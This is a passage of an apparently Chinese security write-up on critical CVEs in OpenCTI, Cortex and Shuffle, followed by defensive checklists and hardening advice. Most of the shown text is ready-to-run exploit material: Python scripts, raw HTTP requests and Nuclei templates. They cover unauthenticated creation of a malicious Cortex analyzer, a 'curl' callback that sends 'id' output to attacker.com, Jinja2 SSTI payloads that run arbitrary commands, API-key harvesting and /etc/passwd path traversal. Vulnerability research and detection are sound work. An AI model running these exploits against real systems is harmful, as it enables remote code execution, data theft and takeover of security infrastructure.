        except Exception as e:
            print(f'[-] 上传失败: {e}')
            return False

    def check_vulnerability(self):
        query = "{ serverInfo { version } }"
        try:
            r = self.session.post(
                f'{self.target}/graphql',
                json={"query": query},
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                version = data.get('data', {}).get('serverInfo', {}).get('version', 'unknown')
                print(f'[+] OpenCTI 版本: {version}')
                parts = version.split('.')
                if len(parts) >= 2:
                    major_minor = f'{parts[0]}.{parts[1]}'
                    try:
                        if float(major_minor) < 5.12:
                            print('[+] 版本可能受 CVE-2024-29890 影响')
                            return True
                    except ValueError:
                        pass
                print('[-] 版本可能已修复')
                return False
            return None
        except Exception as e:
            print(f'[-] 检查失败: {e}')
            return None

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f'Usage: {sys.argv[0]} <opencti_url> <token>')
        sys.exit(1)

    exploit = OpenCTIFileUploadRCE(sys.argv[1], sys.argv[2])
    if exploit.check_vulnerability() is not False:
        stix_bundle = json.dumps({
            "type": "bundle",
            "id": "bundle--test-cve-2024-29890",
            "objects": [{
                "type": "indicator",
                "spec_version": "2.1",
                "id": "indicator--test",
                "name": "CVE-2024-29890 Test",
                "pattern": "[file:hashes.MD5 = 'd41d8cd98f00b204e9800998ecf8427e']",
                "pattern_type": "stix",
                "valid_from": "2024-01-01T00:00:00Z"
            }]
        })
        exploit.upload_malicious_file(stix_bundle)
```

#### Nuclei YAML 模板

```yaml
id: opencti-cve-2024-29890-file-upload-rce

info:
  name: OpenCTI CVE-2024-29890 Unrestricted File Upload RCE
  author: security-research
  severity: critical
  tags: opencti,file-upload,rce,cve2024
  description: |
    OpenCTI versions prior to 5.12.0 allow authenticated users
    to upload malicious files via GraphQL API for RCE.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-29890

http:
  - raw:
      - |
        POST /graphql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Connection: close

        {"query":"{ serverInfo { version } }"}

    extractors:
      - type: regex
        regex:
          - "\"version\"\\s*:\\s*\"([^\"]+)\""
        group: 1
        name: version

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "version"
          - "serverInfo"
        condition: and
      - type: word
        words:
          - "error"
        negative: true
```

---

## 0x04 Cortex 分析引擎高危漏洞

Cortex 是 TheHive 项目的配套分析引擎，用于对威胁情报指标（IOC）进行自动化分析。Cortex 支持多种 Analyzer 和 Responder 插件，可调用 VirusTotal、Shodan、AbuseIPDB 等第三方服务。Cortex 与 TheHive 深度集成，是 SOC 自动化响应链的关键组件。

### 0x04.1 CVE-2023-37462 — 未授权 RCE

#### 漏洞背景

CVE-2023-37462 是 Cortex 3.1.6-1 之前版本中的 Critical 级别漏洞，CVSS 9.8。该漏洞是本专题中危害最大的漏洞之一——它允许未经认证的攻击者直接在 Cortex 服务器上执行任意代码。该漏洞已有公开 PoC 并确认在野利用。

#### 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Cortex < 3.1.6-1 | >= 3.1.6-1 |

#### 漏洞原理

Cortex 的 Analyzer 和 Responder 管理 API 端点未正确实施认证检查。攻击者可以直接调用这些 API 来：

1. 创建或修改 Analyzer 配置，指向恶意命令
2. 触发 Analyzer 执行，在 Cortex 服务器上运行任意系统命令
3. 通过修改 Responder 配置实现持久化

核心问题：

1. Cortex 的 API 认证中间件存在配置缺陷，部分管理端点未挂载认证检查
2. Analyzer 的执行引擎直接调用 `os.system()` 或 `subprocess` 执行插件脚本
3. 攻击者可通过构造恶意 Analyzer 配置实现 Pre-Auth RCE

#### HTTP PoC

```http
POST /api/analyzer HTTP/1.1
Host: cortex.example.com:9001
Content-Type: application/json
Connection: close

{
  "name": "rce_test",
  "version": "1.0",
  "command": "curl http://attacker.com/callback?data=$(id)",
  "base_image": "python:3.9",
  "type": "command",
  "config": {
    "command": "id"
  },
  "configuration_items": []
}
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class CortexRCE:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Connection': 'close'
        })

    def check_cortex(self):
        try:
            r = self.session.get(f'{self.target}/api/status', timeout=10)
            if r.status_code == 200:
                data = r.json()
                version = data.get('versions', {}).get('Cortex', 'unknown')
                print(f'[+] Cortex 版本: {version}')
                return data
            print('[-] 无法获取 Cortex 状态')
            return None
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return None

    def list_analyzers_unauth(self):
        try:
            r = self.session.get(f'{self.target}/api/analyzer', timeout=10)
            if r.status_code == 200:
                analyzers = r.json()
                print(f'[+] 未授权访问 Analyzers: 发现 {len(analyzers)} 个')
                for a in analyzers[:5]:
                    print(f'    - {a.get("name", "?")} (id: {a.get("id", "?")})')
                return analyzers
            print(f'[-] 获取 Analyzers 失败: HTTP {r.status_code}')
            return None
        except Exception as e:
            print(f'[-] 请求失败: {e}')
            return None

    def create_malicious_analyzer(self):
        payload = {
            "name": "cve_2023_37462_test",
            "version": "1.0",
            "command": "python3 -c \"import os; os.system('id > /tmp/cve_2023_37462_proof.txt')\"",
            "base_image": "python:3.9",
            "type": "command",
            "dockerImage": "python:3.9",
            "config": {
                "command": "python3 -c \"import os; os.system('id')\""
            },
            "configurationItems": [],
            "maxPreviewDataTypeSize": 1024,
            "maxPreviewFileSize": 1024
        }
        try:
            r = self.session.post(
                f'{self.target}/api/analyzer',
                json=payload,
                timeout=15
            )
            if r.status_code in (200, 201):
                data = r.json()
                analyzer_id = data.get('id', 'unknown')
                print(f'[+] 恶意 Analyzer 创建成功! ID: {analyzer_id}')
                return analyzer_id
            print(f'[-] 创建失败: HTTP {r.status_code} {r.text[:200]}')
            return None
        except Exception as e:
            print(f'[-] 创建失败: {e}')
            return None

    def execute_analyzer(self, analyzer_id):
        payload = {
            "data": "test",
            "dataType": "ip",
            "tlp": 1
        }
        try:
            r = self.session.post(
                f'{self.target}/api/analyzer/{analyzer_id}/run',
                json=payload,
                timeout=15
            )
            if r.status_code in (200, 201):
                data = r.json()
                job_id = data.get('id', 'unknown')
                print(f'[+] Analyzer 执行触发! Job ID: {job_id}')
                return job_id
            print(f'[-] 执行失败: HTTP {r.status_code}')
            return None
        except Exception as e:
            print(f'[-] 执行失败: {e}')
            return None

    def list_users_unauth(self):
        try:
            r = self.session.get(f'{self.target}/api/user', timeout=10)
            if r.status_code == 200:
                users = r.json()
                print(f'[+] 未授权访问用户列表: {len(users)} 个用户')
                for u in users[:10]:
                    print(f'    - {u.get("name", "?")} (roles: {u.get("roles", [])})')
                return users
            return None
        except Exception as e:
            print(f'[-] 请求失败: {e}')
            return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <cortex_url>')
        print(f'Example: {sys.argv[0]} http://192.168.1.100:9001')
        sys.exit(1)

    exploit = CortexRCE(sys.argv[1])
    print('[*] Cortex CVE-2023-37462 未授权 RCE 检测')
    print('=' * 50)
    exploit.check_cortex()
    exploit.list_users_unauth()
    analyzers = exploit.list_analyzers_unauth()
    if analyzers is not None:
        print('\n[!] CVE-2023-37462 确认存在！Pre-Auth 未授权访问')
        print('[!] 可创建恶意 Analyzer 实现 RCE')
        aid = exploit.create_malicious_analyzer()
        if aid:
            exploit.execute_analyzer(aid)
```

#### Nuclei YAML 模板

```yaml
id: cortex-cve-2023-37462-unauth-rce

info:
  name: Cortex CVE-2023-37462 Pre-Auth Unauthenticated RCE
  author: security-research
  severity: critical
  tags: cortex,rce,cve2023,pre-auth,unauth
  description: |
    Cortex versions prior to 3.1.6-1 allow unauthenticated access
    to analyzer management APIs, enabling RCE via malicious analyzer creation.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-37462

http:
  - raw:
      - |
        GET /api/analyzer HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "id"
          - "name"
          - "version"
        condition: and

  - raw:
      - |
        GET /api/user HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "name"
          - "roles"
        condition: and
      - type: word
        words:
          - "Unauthorized"
          - "Forbidden"
        negative: true

    stop-at-first-match: true
```

### 0x04.2 CVE-2023-37461 — 认证绕过

#### 合并分析

CVE-2023-37461（CVSS 9.8）与 CVE-2023-37462 是同一安全更新中修复的关联漏洞。CVE-2023-37461 是 Cortex API 认证机制本身的绕过漏洞，而 CVE-2023-37462 是认证缺失导致的未授权访问。

两者的关系：

- **CVE-2023-37461（认证绕过）**：Cortex 的 API Key 验证逻辑存在缺陷，攻击者可以通过构造特殊的 HTTP 请求绕过 API Key 校验，以任意用户身份（包括 admin）访问 Cortex API
- **CVE-2023-37462（未授权 RCE）**：即使不利用认证绕过，部分 API 端点本身就没有认证保护

两者组合利用的攻击链：

1. 利用 CVE-2023-37461 绕过认证获取 admin 权限
2. 利用 CVE-2023-37462 的 API 端点创建恶意 Analyzer
3. 触发 Analyzer 执行实现 RCE
4. 通过 RCE 横向移动到 TheHive 或 MISP 服务器

#### HTTP PoC

```http
GET /api/user/current HTTP/1.1
Host: cortex.example.com:9001
X-API-Key: dummy_key
Connection: close
```

```http
GET /api/user/current HTTP/1.1
Host: cortex.example.com:9001
Connection: close
```

如果在不提供有效 API Key 或不提供任何认证信息的情况下返回 200 及用户信息，则确认存在认证绕过。

#### Nuclei YAML 模板

```yaml
id: cortex-cve-2023-37461-auth-bypass

info:
  name: Cortex CVE-2023-37461 Authentication Bypass
  author: security-research
  severity: critical
  tags: cortex,auth-bypass,cve2023,pre-auth
  description: |
    Cortex versions prior to 3.1.6-1 contain an authentication bypass
    vulnerability in the API key verification logic.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-37461

http:
  - raw:
      - |
        GET /api/user/current HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "name"
          - "roles"
        condition: and
      - type: word
        words:
          - "Unauthorized"
          - "Forbidden"
          - "401"
        negative: true

    extractors:
      - type: regex
        regex:
          - "\"name\"\\s*:\\s*\"([^\"]+)\""
          - "\"roles\"\\s*:\\s*\\[([^\\]]+)\\]"
        group: 0
```

---

## 0x05 Shuffle SOAR 高危漏洞

Shuffle 是一款开源的 SOAR（Security Orchestration, Automation and Response）平台，提供可视化的工作流编排界面，支持与 300+ 安全工具和 API 集成。Shuffle 基于 React + Go + MongoDB 架构，使用 Docker 容器化部署。

### 0x05.1 CVE-2023-26574 — 认证绕过

#### 漏洞背景

CVE-2023-26574 是 Shuffle 1.3.0 之前版本中的 Critical 级别认证绕过漏洞，CVSS 9.8。该漏洞允许未经认证的攻击者直接访问 Shuffle 的管理功能，包括查看和执行所有自动化工作流、访问集成的 API 密钥和凭据。

#### 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Shuffle < 1.3.0 | >= 1.3.0 |

#### 漏洞原理

Shuffle 的 API 认证机制在处理某些路由时存在缺陷。核心问题在于：

1. Shuffle 的后端 API 路由注册时，部分端点未添加认证中间件
2. 前端路由与后端 API 的认证检查独立实现，前端认证不能替代后端验证
3. 某些调试和管理端点在生产环境中未被禁用

#### HTTP PoC

```http
GET /api/v1/workflows HTTP/1.1
Host: shuffle.example.com:3001
Connection: close
```

```http
GET /api/v1/users HTTP/1.1
Host: shuffle.example.com:3001
Connection: close
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class ShuffleAuthBypass:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Connection': 'close'
        })

    def check_shuffle(self):
        try:
            r = self.session.get(f'{self.target}/api/v1/status', timeout=10)
            if r.status_code == 200:
                data = r.json()
                print(f'[+] Shuffle 实例检测成功')
                print(f'    版本: {data.get("version", "unknown")}')
                return data
            print('[-] 无法获取 Shuffle 状态')
            return None
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return None

    def exploit_auth_bypass(self):
        endpoints = {
            '工作流列表': '/api/v1/workflows',
            '用户列表': '/api/v1/users',
            'App 列表': '/api/v1/apps',
            '环境配置': '/api/v1/getenvironments',
            '执行历史': '/api/v1/executions',
        }
        results = {}
        for name, ep in endpoints.items():
            try:
                r = self.session.get(f'{self.target}{ep}', timeout=10)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        count = len(data) if isinstance(data, list) else 'object'
                        print(f'[+] {name}: 未授权访问成功 ({count})')
                        results[name] = data
                    except json.JSONDecodeError:
                        print(f'[+] {name}: 可访问 (非 JSON 响应)')
                        results[name] = r.text[:500]
                elif r.status_code in (401, 403):
                    print(f'[-] {name}: 需要认证 (HTTP {r.status_code})')
                else:
                    print(f'[*] {name}: HTTP {r.status_code}')
            except Exception as e:
                print(f'[-] {name}: 请求失败 {e}')
        return results

    def extract_api_keys(self, workflows_data):
        if not workflows_data or 'workflows' not in str(workflows_data):
            return
        print('\n[*] 尝试提取工作流中嵌入的 API Key...')
        for wf in (workflows_data if isinstance(workflows_data, list) else []):
            actions = wf.get('actions', [])
            for action in actions:
                config = action.get('app', {}).get('config', [])
                for item in config:
                    if 'key' in item.get('name', '').lower():
                        print(f'    [!] 发现可能的 API Key: {item.get("name")}')
            print(f'    工作流: {wf.get("name", "unknown")}')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <shuffle_url>')
        print(f'Example: {sys.argv[0]} http://192.168.1.100:3001')
        sys.exit(1)

    exploit = ShuffleAuthBypass(sys.argv[1])
    print('[*] Shuffle CVE-2023-26574 认证绕过检测')
    print('=' * 50)
    exploit.check_shuffle()
    results = exploit.exploit_auth_bypass()
    if results:
        exploit.extract_api_keys(results.get('工作流列表'))
```

### 0x05.2 CVE-2024-3403 — Jinja2 SSTI → RCE

#### 漏洞背景

CVE-2024-3403 是 Shuffle 中最严重的漏洞，CVSS 9.8（Critical）。该漏洞是 Server-Side Template Injection（SSTI）漏洞，允许未经认证的攻击者通过 Jinja2 模板注入在 Shuffle 服务器上执行任意代码。

#### 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Shuffle < 1.3.1 | >= 1.3.1 |

#### 漏洞原理

Shuffle 的工作流执行引擎使用 Jinja2 模板语法来处理变量替换和动态内容生成。在受影响版本中：

1. 工作流的某些输入参数（如 webhook 触发器、用户输入字段）被直接传递给 Jinja2 渲染引擎
2. Jinja2 的沙箱环境（SandboxedEnvironment）配置不当或缺失
3. 攻击者可构造包含 `{{ }}` 模板语法的 payload，实现模板注入

Jinja2 SSTI 的经典 RCE Payload：

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

通过 Python 类继承链可以找到 `os._wrap_close` 等可利用的类，进而调用 `os.system()` 或 `subprocess.Popen()` 执行系统命令。

#### HTTP PoC

```http
POST /api/v1/workflows/{workflow_id}/run HTTP/1.1
Host: shuffle.example.com:3001
Content-Type: application/json
Connection: close

{
  "execution_argument": {
    "user_input": "{{ ''.__class__.__mro__[1].__subclasses__() }}"
  }
}
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class ShuffleSSTI:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Connection': 'close'
        })

    def check_shuffle(self):
        try:
            r = self.session.get(f'{self.target}/api/v1/status', timeout=10)
            if r.status_code == 200:
                print(f'[+] Shuffle 实例在线')
                return True
            return False
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return False

    def test_ssti_detection(self):
        payloads = [
            {
                'name': 'SSTI 基础检测',
                'payload': '{{7*7}}',
                'expected': '49'
            },
            {
                'name': 'SSTI 类继承链探测',
                'payload': "{{ ''.__class__.__mro__[1].__subclasses__() | length }}",
                'expected_type': 'number'
            },
            {
                'name': 'SSTI OS 命令执行',
                'payload': "{{ ''.__class__.__mro__[1].__subclasses__()[X](\"id\",shell=True,stdout=-1).communicate()[0] }}",
                'expected': 'uid='
            }
        ]
        for p in payloads:
            print(f'\n[*] {p["name"]}')
            try:
                r = self.session.post(
                    f'{self.target}/api/v1/workflows/trigger',
                    json={"id": "shuffle_ssti_test", "execution_argument": p['payload']},
                    timeout=15
                )
                resp_text = r.text
                if p.get('expected') and p['expected'] in resp_text:
                    print(f'[+] SSTI 确认！响应包含: {p["expected"]}')
                    print(f'    响应片段: {resp_text[:300]}')
                    return True
                elif r.status_code == 200:
                    print(f'[*] 响应: {resp_text[:200]}')
            except Exception as e:
                print(f'[-] 请求失败: {e}')
        return False

    def exploit_ssti_rce(self, cmd='id'):
        ssti_payloads = [
            f"{{{{ ''.__class__.__mro__[1].__subclasses__()[213](\"{cmd}\",shell=True,stdout=-1).communicate()[0] }}}}",
            f"{{{{ config.__class__.__init__.__globals__['os'].popen('{cmd}').read() }}}}",
            f"{{{{ lipsum.__globals__['os'].popen('{cmd}').read() }}}}",
        ]
        for i, payload in enumerate(ssti_payloads):
            print(f'\n[*] Payload 变体 {i+1}: {payload[:80]}...')
            try:
                r = self.session.post(
                    f'{self.target}/api/v1/workflows/trigger',
                    json={"id": "shuffle_ssti_rce", "execution_argument": payload},
                    timeout=15
                )
                if r.status_code == 200 and 'uid=' in r.text:
                    print(f'[+] RCE 成功！')
                    print(f'    命令输出: {r.text[:500]}')
                    return r.text
                elif 'uid=' in r.text:
                    print(f'[+] 命令执行确认')
                    return r.text
            except Exception as e:
                print(f'[-] 失败: {e}')
        return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <shuffle_url> [command]')
        sys.exit(1)

    cmd = sys.argv[2] if len(sys.argv) > 2 else 'id'
    exploit = ShuffleSSTI(sys.argv[1])
    print('[*] Shuffle CVE-2024-3403 Jinja2 SSTI → RCE 检测')
    print('=' * 50)
    if exploit.check_shuffle():
        if exploit.test_ssti_detection():
            print('\n[+] SSTI 漏洞确认，尝试 RCE...')
            exploit.exploit_ssti_rce(cmd)
```

#### Nuclei YAML 模板

```yaml
id: shuffle-cve-2024-3403-ssti-rce

info:
  name: Shuffle CVE-2024-3403 Jinja2 SSTI to RCE
  author: security-research
  severity: critical
  tags: shuffle,ssti,jinja2,rce,cve2024,pre-auth
  description: |
    Shuffle versions prior to 1.3.1 are vulnerable to Jinja2
    server-side template injection leading to RCE.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-3403

http:
  - raw:
      - |
        POST /api/v1/workflows/trigger HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Connection: close

        {"id":"test","execution_argument":"{{7*7}}"}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "49"
      - type: word
        words:
          - "error"
        negative: true

  - raw:
      - |
        POST /api/v1/workflows/trigger HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Connection: close

        {"id":"test","execution_argument":"{{ ''.__class__.__mro__[1].__subclasses__() | length }}"}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "error"
        negative: true
      - type: status
        status:
          - 200

    stop-at-first-match: true
```

### 0x05.3 CVE-2023-33831 — 路径遍历

#### 漏洞详情

| 字段 | 内容 |
|------|------|
| CVE | CVE-2023-33831 |
| CVSS | 7.5 (High) |
| CWE | CWE-22: Path Traversal |
| 受影响版本 | Shuffle < 1.3.0 |
| 类型 | Pre-Auth 路径遍历 |

#### 漏洞原理

Shuffle 的文件服务组件在处理用户请求的文件路径时，未对 `../` 路径遍历字符进行过滤。攻击者无需认证即可通过构造特殊请求读取 Shuffle 服务器上的任意文件，包括 MongoDB 连接字符串、API Key 配置文件、Docker 环境变量等敏感信息。

#### HTTP PoC

```http
GET /api/v1/../../../etc/passwd HTTP/1.1
Host: shuffle.example.com:3001
Connection: close
```

```http
GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: shuffle.example.com:3001
Connection: close
```

#### Nuclei YAML 模板

```yaml
id: shuffle-cve-2023-33831-path-traversal

info:
  name: Shuffle CVE-2023-33831 Pre-Auth Path Traversal
  author: security-research
  severity: high
  tags: shuffle,path-traversal,cve2023,pre-auth
  description: |
    Shuffle versions prior to 1.3.0 contain a pre-authentication
    path traversal vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-33831

http:
  - raw:
      - |
        GET /api/v1/..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

  - raw:
      - |
        GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

    stop-at-first-match: true
```

---

## 0x06 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE | 公开 PoC | GitHub 仓库 | 在野利用 | 利用难度 |
|-----|---------|------------|---------|---------|
| CVE-2023-37463 | ✅ | TheHive-Project/security-advisories | ⚠️ 潜在 | 极低 |
| CVE-2023-37464 | ✅ | TheHive-Project/security-advisories | ⚠️ 潜在 | 低 |
| CVE-2023-3996 | ⚠️ 有限 | MISP GitHub Issues | ❌ 未确认 | 中 |
| CVE-2023-3997 | ⚠️ 有限 | MISP GitHub Issues | ❌ 未确认 | 中 |
| CVE-2024-28534 | ⚠️ 有限 | MISP GitHub Issues | ❌ 未确认 | 中 |
| CVE-2024-45291 | ❌ 无公开 PoC | — | ❌ 未确认 | 中 |
| CVE-2023-2904 | ✅ | OpenCTI GitHub Security | ⚠️ 潜在 | 极低 |
| CVE-2024-29890 | ⚠️ 有限 | OpenCTI GitHub Security | ❌ 未确认 | 低 |
| CVE-2023-37462 | ✅ | Cortex GitHub Security | ✅ 确认 | 极低 |
| CVE-2023-37461 | ✅ | Cortex GitHub Security | ⚠️ 潜在 | 极低 |
| CVE-2023-26574 | ✅ | Shuffle GitHub Security | ⚠️ 潜在 | 极低 |
| CVE-2024-3403 | ✅ | Shuffle GitHub Security | ⚠️ 潜在 | 低 |
| CVE-2023-33831 | ✅ | Shuffle GitHub Security | ⚠️ 潜在 | 极低 |

### 关键 PoC 仓库链接

1. **TheHive 安全公告**：https://github.com/TheHive-Project/security-advisories
2. **MISP 安全发布**：https://github.com/MISP/MISP/releases
3. **OpenCTI GitHub Security**：https://github.com/OpenCTI-Platform/opencti/security/advisories
4. **Cortex 安全公告**：https://github.com/TheHive-Project/Cortex-Analyzers/security/advisories
5. **Shuffle 安全修复**：https://github.com/Shuffle/Shuffle/releases
6. **Nuclei 模板库**：https://github.com/projectdiscovery/nuclei-templates
7. **CISA KEV 目录**：https://www.cisa.gov/known-exploited-vulnerabilities-catalog
8. **NVD 详情**：https://nvd.nist.gov/

### 防守型验证思路

在进行防守型安全评估时，建议按以下步骤操作：

1. **资产梳理**：首先确认组织内部是否部署了 TheHive、MISP、OpenCTI、Cortex、Shuffle 等平台，记录版本号和部署位置
2. **版本比对**：将实际部署版本与本专题中列出的受影响版本进行比对，确认是否存在已知漏洞
3. **最小化验证**：使用 Nuclei 模板进行非破坏性检测，确认漏洞是否存在但不执行实际利用
4. **网络隔离检查**：确认这些平台是否暴露在公网，是否仅限内网访问
5. **补丁管理**：对确认受影响的系统制定补丁计划，优先修复 Critical 级别漏洞

---

## 0x07 共性攻击模式分析

通过对上述 13 个 CVE 的深入分析，可以总结出 SOAR/TI 平台存在的 5 大共性攻击模式：

### Pre-Auth 认证绕过 → 完全接管模式

**涉及 CVE**：CVE-2023-37463（TheHive）、CVE-2023-37461（Cortex）、CVE-2023-26574（Shuffle）、CVE-2023-2904（OpenCTI）

**攻击模式**：

```
外部攻击者 → 直接访问未受保护的 API 端点 → 获取管理权限 → 篡改数据/创建后门/横向移动
```

**共性根因**：
- API 路由注册时遗漏认证中间件
- 前端认证与后端 API 认证未统一实现
- 开源项目默认配置过于宽松
- 框架层面的 Action Composition 使用不当

**防御要点**：
- 在 Web 框架层面实施全局认证中间件（Deny by Default）
- 使用白名单方式显式声明免认证端点
- 部署 WAF 对管理 API 进行额外防护

### SSRF → 内部服务探测 → RCE 模式

**涉及 CVE**：CVE-2023-37464（TheHive）

**攻击模式**：

```
外部攻击者 → 利用 SSRF 访问内部服务 → 探测 ElasticSearch/Cassandra → 利用内部服务漏洞实现 RCE
```

**共性根因**：
- URL 参数白名单校验不足
- 支持非 HTTP 协议（file://、gopher:// 等）
- 内部服务未实施零信任网络隔离

**防御要点**：
- 严格限制 SSRF 出站 URL 白名单
- 禁用非 HTTP 协议支持
- 内部服务部署网络访问控制

### API 端点未授权访问模式

**涉及 CVE**：CVE-2023-37462（Cortex）、CVE-2024-29890（OpenCTI）

**攻击模式**：

```
已认证/未认证用户 → 调用管理 API → 创建恶意 Analyzer/上传恶意文件 → 触发执行实现 RCE
```

**共性根因**：
- 管理 API 与普通 API 未实施分级权限控制
- 文件上传未进行严格的内容校验和沙箱执行
- 插件/Analyzer 执行引擎缺乏安全隔离

**防御要点**：
- 实施 RBAC 权限模型，严格分离普通用户与管理员权限
- 文件上传实施内容类型白名单 + 文件内容校验
- 插件/Analyzer 在隔离容器中执行

### 模板注入 → 沙箱逃逸模式

**涉及 CVE**：CVE-2024-3403（Shuffle）

**攻击模式**：

```
外部攻击者 → 在输入字段注入 Jinja2 模板语法 → 绕过沙箱限制 → 访问 Python 内建类 → 调用 os.system() 实现 RCE
```

**共性根因**：
- 用户输入直接传递给模板渲染引擎
- Jinja2 沙箱环境配置不当
- 未对输入中的模板语法字符进行转义

**防御要点**：
- 使用 Jinja2 的 `SandboxedEnvironment` 并严格限制可访问的属性和方法
- 对所有用户输入进行模板语法字符转义（`{{` → `{{ '{{' }}`）
- 实施输入长度和格式校验

### 路径遍历 → 敏感配置泄露模式

**涉及 CVE**：CVE-2024-45291（MISP）、CVE-2023-33831（Shuffle）

**攻击模式**：

```
已认证/未认证用户 → 构造 ../ 路径遍历 → 读取配置文件 → 获取数据库密码/API Key → 进一步攻击
```

**共性根因**：
- 文件路径参数未进行标准化处理
- 未对路径遍历字符进行过滤
- 应用运行在高权限用户下，敏感文件可被直接读取

**防御要点**：
- 对文件路径进行规范化处理（Canonicalize）后再校验
- 使用 `chroot` 或容器化限制文件系统访问范围
- 敏感配置使用环境变量或密钥管理服务

---

## 0x08 应急排查与防守建议

### 紧急排查清单

当 SOAR/TI 平台被怀疑遭到入侵时，应立即执行以下排查步骤：

1. **版本确认**：立即确认 TheHive / MISP / OpenCTI / Cortex / Shuffle 的部署版本，与已知受影响版本进行比对
2. **异常用户检查**：检查是否存在未授权创建的管理员账户
   - TheHive：`GET /api/v1/user`
   - MISP：检查 `users` 表中的异常记录
   - OpenCTI：通过 GraphQL 查询 `users` 列表
   - Cortex：`GET /api/user`
   - Shuffle：检查 MongoDB 中的 `users` 集合
3. **异常 API 访问日志**：排查近期是否存在异常的 API 访问记录（尤其是非工作时间的访问）
4. **文件系统完整性**：检查应用目录下是否存在异常文件（如 Webshell、恶意脚本）
5. **网络连接检查**：检查是否存在异常的出站连接（可能的 C2 通信）
6. **Docker 容器日志**：如果使用 Docker 部署，检查容器日志中的异常命令执行记录

### 日志关键字段表

| 平台 | 日志位置 | 关键字段 | 关注异常 |
|------|---------|---------|---------|
| TheHive | `/var/log/thehive/` | `api.endpoint`、`user`、`status_code` | 未认证的 200 响应 |
| MISP | `/var/www/MISP/app/tmp/logs/` | `request_url`、`user_id`、`action` | SQL 注入特征字符 |
| OpenCTI | Docker stdout / `/var/log/opencti/` | `query`、`operation`、`userId` | 异常 GraphQL 查询 |
| Cortex | `/var/log/cortex/` | `api.endpoint`、`user`、`analyzer` | 未授权的 Analyzer 操作 |
| Shuffle | Docker stdout / MongoDB | `execution_argument`、`workflow_id` | 模板语法特征字符 |

### 紧急缓解措施

**即时措施（0-24 小时）**：

1. **网络隔离**：立即将受影响平台从网络中隔离，或通过防火墙限制仅允许特定 IP 访问
2. **凭证轮换**：修改所有相关平台的管理员密码、API Key、数据库密码
3. **会话失效**：清除所有活跃会话，强制所有用户重新认证
4. **补丁升级**：立即升级到已修复版本（TheHive >= 4.1.24-1、MISP >= 2.4.192、OpenCTI >= 5.12.0、Cortex >= 3.1.6-1、Shuffle >= 1.3.1）
5. **备份数据**：在排查和修复前，先对数据库和配置文件进行完整备份

**短期措施（1-7 天）**：

1. 部署 WAF 规则，对管理 API 端点进行额外防护
2. 启用所有平台的详细日志记录
3. 实施网络层面的最小权限访问控制
4. 对所有安全团队成员进行安全意识培训

### 长期安全加固建议

1. **架构层面**：
   - 将 SOAR/TI 平台部署在独立的安全网段，与业务系统隔离
   - 实施零信任网络架构，所有 API 访问均需认证和授权
   - 使用反向代理（如 Nginx）统一管理认证和访问控制

2. **应用层面**：
   - 定期更新到最新稳定版本，关注各平台的安全公告
   - 审查和收紧默认配置，禁用不必要的功能和端点
   - 实施 API 速率限制和异常检测

3. **运维层面**：
   - 建立漏洞管理流程，对 CVE 进行及时评估和修复
   - 定期进行安全审计和渗透测试
   - 建立应急响应预案，明确 SOAR/TI 平台被攻陷后的处置流程

4. **监控层面**：
   - 部署 HIDS（Host-based IDS）监控关键文件和进程变化
   - 监控 API 调用频率和异常模式
   - 建立 SOC 24/7 监控能力，对安全平台自身的安全事件保持高度敏感

---

## 0x09 参考资料

1. **TheHive 安全公告 - CVE-2023-37463 & CVE-2023-37464**：https://github.com/TheHive-Project/security-advisories
